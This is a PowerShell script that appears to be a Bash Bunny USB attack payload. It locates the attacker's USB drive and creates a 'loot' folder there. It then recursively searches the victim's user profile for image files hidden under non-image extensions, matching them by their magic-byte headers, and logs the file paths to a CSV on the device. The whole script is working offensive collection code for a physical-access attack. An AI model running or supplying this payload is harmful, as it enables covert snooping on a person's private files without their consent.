
#Get the path and file name that you are using for output
# find connected bashbunny drive:
$VolumeName = "bashbunny"
$computerSystem = Get-CimInstance CIM_ComputerSystem
$backupDrive = $null
get-wmiobject win32_logicaldisk | % {
    if ($_.VolumeName -eq $VolumeName) {
        $backupDrive = $_.DeviceID
    }
}

#See if a loot folder exist in usb. If not create one
$TARGETDIR = $backupDrive + "\loot"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#See if a info folder exist in loot folder. If not create one
$TARGETDIR = $backupDrive + "\loot\Hidden-Image-Files"
if(!(Test-Path -Path $TARGETDIR )){
    New-Item -ItemType directory -Path $TARGETDIR
}

#Create a path that will be used to make the file
$datetime = get-date -f yyyy-MM-dd_HH-mm
$backupPath = $backupDrive + "\loot\Hidden-Image-Files\"

#Create output from info script
$TARGETDIR = $MyInvocation.MyCommand.Path
$TARGETDIR = $TARGETDIR -replace ".......$"
cd $TARGETDIR


$jpgheader = "255 216 255"
$bmpheader = "66 77"
$gifheader = "71 73 70"
$tifheader = "73 73 42"
$pngheader = "137 80 78 71 13 10 26 10"

$knownimageextensions = ("jpg", "jpeg", "bmp", "gif", "tif", "tiff", "png")

#walk the files in the user profile
$files = Get-ChildItem $env:USERPROFILE -Recurse -ErrorAction silentlycontinue | select-object -Expand Fullname


foreach ($file in $files)
{

#get extension without . (dot)
$extension = [System.IO.Path]::GetExtension($file).Replace(".", "")
$extension = $extension.ToLower()

#Ignore known image extension
if (!$knownimageextensions.contains($extension) -and (Get-Item $file).length -gt 0.1kb) {

#reset $fileheader
$fileheader = "False"

#Grab header
$2bytes = [string](Get-Content $file -Encoding Byte -ReadCount 1 -TotalCount 2 -EA ignore)
$3bytes = [string](Get-Content $file -Encoding Byte -ReadCount 1 -TotalCount 3 -EA ignore)
$8bytes = [string](Get-Content $file -Encoding Byte -ReadCount 1 -TotalCount 8 -EA ignore)

If ($8bytes -eq $pngheader) {$fileheader = "png"}
Elseif ($3bytes -eq $jpgheader) {$fileheader = "jpg"}
Elseif ($3bytes -eq $gifheader) {$fileheader = "gif"}
Elseif ($3bytes -eq $tifheader) {$fileheader = "tif"}
Elseif ($2bytes -eq $bmpheader) {$fileheader = "bmp"}


if ($fileheader -ne "False") {
[PSCustomObject]@{
       File = $file
       Header = $fileheader
       } | Export-Csv $backupPath\$datetime.csv -notype -Append 
}
}
}

